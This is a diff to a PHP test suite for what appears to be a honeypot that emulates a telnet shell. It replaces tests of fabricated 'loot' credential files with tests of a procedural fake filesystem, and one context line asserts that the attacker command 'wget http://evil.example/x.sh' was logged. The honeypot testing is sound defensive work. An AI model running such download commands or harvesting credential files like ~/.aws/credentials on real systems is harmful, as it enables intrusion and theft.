@@ -120,32 +120,28 @@ final class ProtocolEngineTest extends TestCase
         self::assertContains('wget http://evil.example/x.sh', $log);
     }
 
-    public function test_telnet_shell_serves_fabricated_loot_files(): void
+    public function test_telnet_shell_serves_fabricated_content(): void
     {
-        // The fake box stages crypto/cloud/app "loot" so scanners waste time hunting it. Verify a
-        // few of those files cat cleanly and carry their fabricated markers — the values are inert.
+        // The fake box (now a procedural FakeFilesystem) serves believable, inert, coherent content.
         $e = $this->emu('telnet');
         $s = new ProtocolSession(9);
         $e->banner($s);
         $e->feed("root\r\n", $s);       // username -> password prompt
         $e->feed("hunter2\r\n", $s);    // accept-all login
 
-        // Cloud creds: AWS's documented example key IDs (never live).
-        $aws = $e->feed("cat /root/.aws/credentials\r\n", $s);
-        self::assertStringContainsString('AKIAIOSFODNN7EXAMPLE', $aws);
-        self::assertStringContainsString('EXAMPLEKEY', $aws);
+        // Pinned system files cat cleanly.
+        $passwd = $e->feed("cat /etc/passwd\r\n", $s);
+        self::assertStringContainsString('root:x:0:0', $passwd);
+        self::assertStringContainsString("ID=", $e->feed("cat /etc/os-release\r\n", $s));
 
-        // Solana keypair: a constant deadbeef byte pattern, not a random funded key.
-        $sol = $e->feed("cat ~/.config/solana/id.json\r\n", $s);  // tilde must expand to /root
-        self::assertStringContainsString('222,173,190,239', $sol);
+        // uname is a real, coherent kernel string; the prompt host matches it.
+        $uname = $e->feed("uname -a\r\n", $s);
+        self::assertStringContainsString('Linux', $uname);
+        self::assertStringContainsString('x86_64', $uname);
 
-        // App secrets: fabricated DB password + Stripe token markers.
-        $env = $e->feed("cat /var/www/html/.env\r\n", $s);
-        self::assertStringContainsString('S3cr3t-f4ke-db-p4ss', $env);
-        self::assertStringContainsString('sk_live_FAKEstripe', $env);
-
-        // The loot is discoverable: it shows up when listing the home directory.
-        self::assertStringContainsString('wallet.dat', $e->feed("ls /root\r\n", $s));
+        // The home directory lists procedural content, and a missing file fails like real Linux.
+        self::assertNotSame('', trim($e->feed("ls -la /root\r\n", $s)));
+        self::assertStringContainsString('No such file or directory', $e->feed("cat /root/nope-zzz\r\n", $s));
     }
 
     public function test_telnet_interactive_char_mode_cr_iac_and_backspace(): void
@@ -175,7 +171,8 @@ final class ProtocolEngineTest extends TestCase
         $e->feed("\x7f", $s, $cb);
         $out = $e->feed("ami\r", $s, $cb);
         self::assertContains('whoami', $log, 'backspace-corrected command logged cleanly');
-        self::assertStringContainsString('root@web01:~#', $out, 'root prompt uses ~ and #, not a polluted $');
+        // Prompt is root@<seeded-hostname>:~# — the host matches uname/hostname (not a hardcoded web01).
+        self::assertMatchesRegularExpression('/root@[a-z0-9][a-z0-9-]*:~# /', $out, 'root prompt uses the shell hostname, ~ and #');
     }
 
     // --- codec framing + bounds + safety ---
